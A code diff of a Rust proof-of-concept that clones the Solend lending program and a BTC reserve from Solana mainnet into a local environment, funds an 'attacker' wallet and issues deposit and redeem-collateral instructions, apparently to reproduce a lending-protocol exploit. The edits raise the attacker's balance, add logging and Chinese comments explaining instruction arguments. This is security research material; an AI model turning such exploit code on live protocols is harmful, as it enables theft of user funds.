@@ -1,6 +1,6 @@
 use std::str::FromStr;
 use poc_framework::solana_program::pubkey::Pubkey;
-use poc_framework::{keypair, LocalEnvironment, solana_program};
+use poc_framework::{keypair, LocalEnvironment, setup_logging, solana_program};
 use poc_framework::solana_sdk::system_program;
 use poc_framework::solana_client::rpc_client::RpcClient;
 use poc_framework::solana_program::native_token::sol_to_lamports;
@@ -17,12 +17,14 @@ use poc_framework::solana_sdk::account::Account;
 use solend_token_lending::state::{Reserve, ReserveLiquidity};
 use solend_token_lending::state::Obligation;
 use poc_framework::Environment;
+use poc_framework::LogLevel::DEBUG;
 use solend_token_lending;
 use spl_token::state::Account as SPLAccount;
 
 pub fn demo002() {
     // clone state with BTC reserve from cluster
 
+    // setup_logging(DEBUG);
     let solend_program_key =
         Pubkey::from_str("So1endDq2YkqhipRh3WViPa8hdiSpxWy6z3Z6tMCpAo").unwrap();
     let lending_market_key =
@@ -38,7 +40,6 @@ pub fn demo002() {
     let data = mainnet_client.get_account(&reserve_key).unwrap().data;
 
     let reserve = Reserve::unpack(&data).unwrap();
-    println!("{}", reserve.lending_market);
 
 // accounts we will use
     let attacker = keypair(0);
@@ -46,9 +47,10 @@ pub fn demo002() {
     let liquidity_ata =
         get_associated_token_address(&attacker.pubkey(), &reserve.liquidity.mint_pubkey);
     let collateral_ata =
-        get_associated_token_address(&attacker.pubkey(), &reserve.collateral.mint_pubkey);
+        get_associated_token_address(&attacker.pubkey(), &reserve.collateral.mint_pubkey); // 根据attacker的钱包地址和token(eth)的质押池的地址，得到对应的eth币质押池的地址.
 
     let mut env = LocalEnvironment::builder()
+        .set_creation_time(1636616323000)
         // clone Solend program and state
         .clone_upgradable_program_from_cluster(&mainnet_client, solend_program_key)
         .clone_accounts_from_cluster(
@@ -69,7 +71,7 @@ pub fn demo002() {
         .add_account_with_lamports(
             attacker.pubkey(),
             system_program::ID,
-            sol_to_lamports(100.0),
+            sol_to_lamports(10000.0),
         )
         // and some BTC
         .add_associated_account_with_tokens(
@@ -142,17 +144,39 @@ pub fn demo002() {
             .amount as f64
             / 1_000_000.0
     );
-    println!(
-        "collateral Amount after: {} BTC",
-        env.get_unpacked_account::<SPLAccount>(collateral_ata)
-            .unwrap()
-            .amount as f64
-            / 1_000_000.0
-    );
+    // println!(
+    //     "collateral Amount after: {} BTC",
+    //     env.get_unpacked_account::<SPLAccount>(collateral_ata)
+    //         .unwrap()
+    //         .amount as f64
+    //         / 1_000_000.0
+    // );
     println!("Using {} BTC", input as f64 / 1_000_000.0);
-    let input = input;
-    let collateral_amount = collateral_amount;
 
+
+    // println!("{:?}",  solend_token_lending::instruction::deposit_reserve_liquidity(
+    //     solend_program_key,
+    //     input,
+    //     liquidity_ata,
+    //     collateral_ata,
+    //     reserve_key,
+    //     reserve.liquidity.supply_pubkey,
+    //     reserve.collateral.mint_pubkey,
+    //     lending_market_key,
+    //     attacker.pubkey(),
+    // ));
+    //
+    // println!("{:?}",   solend_token_lending::instruction::redeem_reserve_collateral(
+    //     solend_program_key, // 在solana链上，solend对应的programId.
+    //     collateral_amount, // 你借币，需要做质押，这里就是质押的以太的数量.
+    //     collateral_ata, // attacker钱包里接收eth的地址.为啥是source呢
+    //     liquidity_ata, // 流动性提供者的地址，目的地址
+    //     reserve_key, // 池子的key
+    //     reserve.collateral.mint_pubkey,
+    //     reserve.liquidity.supply_pubkey,
+    //     lending_market_key,
+    //     attacker.pubkey(),
+    // ));
 // deposit and withdraw btc
     env.execute_as_transaction(
         &[
@@ -180,13 +204,13 @@ pub fn demo002() {
             //     obligation.pubkey(),
             //     vec![],
             // ),
-            // withdraw
+            // // withdraw
             // solend_token_lending::instruction::redeem_reserve_collateral(
-            //     solend_program_key,
-            //     collateral_amount,
-            //     collateral_ata,
-            //     liquidity_ata,
-            //     reserve_key,
+            //     solend_program_key, // 在solana链上，solend对应的programId.
+            //     collateral_amount , // 你借币，需要做质押，这里就是质押的以太的数量.
+            //     collateral_ata, // attacker钱包里接收eth的地址.为啥是source呢
+            //     liquidity_ata, // 流动性提供者的地址，目的地址
+            //     reserve_key, // 池子的key
             //     reserve.collateral.mint_pubkey,
             //     reserve.liquidity.supply_pubkey,
             //     lending_market_key,
